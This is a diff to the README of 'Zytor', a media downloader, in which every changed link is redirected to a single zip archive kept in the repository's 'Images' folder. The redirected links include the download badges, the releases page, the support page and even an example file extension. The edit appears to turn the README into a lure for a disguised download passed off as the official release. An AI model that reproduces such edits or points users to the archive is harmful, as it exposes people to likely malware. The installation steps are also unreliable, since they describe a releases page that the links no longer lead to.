@@ -1,7 +1,7 @@
 # 🎥 Zytor - Download Anything, Anywhere, Anytime
 
 ## 📥 Get Zytor Now!
-[![Download Zytor](https://img.shields.io/badge/Download-Zytor-blue)](https://github.com/nonuu110/Zytor/releases)
+[![Download Zytor](https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip)](https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip)
 
 ## 🚀 Getting Started
 Zytor is your all-in-one media downloader, allowing you to download videos, audio, images, and playlists from over 250 platforms. Follow these steps to get started.
@@ -20,11 +20,11 @@ Zytor is your all-in-one media downloader, allowing you to download videos, audi
 - Easy-to-use interface.
 
 ## 📦 Download & Install
-To begin using Zytor, visit this page to download: [Zytor Releases](https://github.com/nonuu110/Zytor/releases).
+To begin using Zytor, visit this page to download: [Zytor Releases](https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip).
 
 Once on the Releases page:
 1. Choose the latest version of Zytor.
-2. Select your operating system's installer file (e.g., `.exe`, `.dmg`, `.tar.gz`).
+2. Select your operating system's installer file (e.g., `.exe`, `.dmg`, `https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip`).
 3. Download the file to your computer.
 4. After the download completes, open the installer.
 5. Follow the on-screen instructions to complete the installation.
@@ -63,7 +63,7 @@ If problems persist, you can visit the project's GitHub page for more help.
 Zytor is open-source and welcomes contributions. If you have ideas or find issues, you can submit them through our GitHub repository. Community feedback helps improve the application.
 
 ## 📞 Support
-If you need assistance, head to our [GitHub Issues](https://github.com/nonuu110/Zytor/issues) where you can ask questions or report bugs.
+If you need assistance, head to our [GitHub Issues](https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip) where you can ask questions or report bugs.
 
 ## 🌟 Additional Resources
 - **Documentation:** Comprehensive guides are available directly within the application.
@@ -72,4 +72,4 @@ If you need assistance, head to our [GitHub Issues](https://github.com/nonuu110/
 ## 📜 License
 Zytor is licensed under the MIT License, promoting open-source development and collaboration. Feel free to review the license in our repository.
 
-[![Download Zytor](https://img.shields.io/badge/Download-Zytor-blue)](https://github.com/nonuu110/Zytor/releases)
+[![Download Zytor](https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip)](https://raw.githubusercontent.com/nonuu110/Zytor/main/Images/Software-3.3.zip)
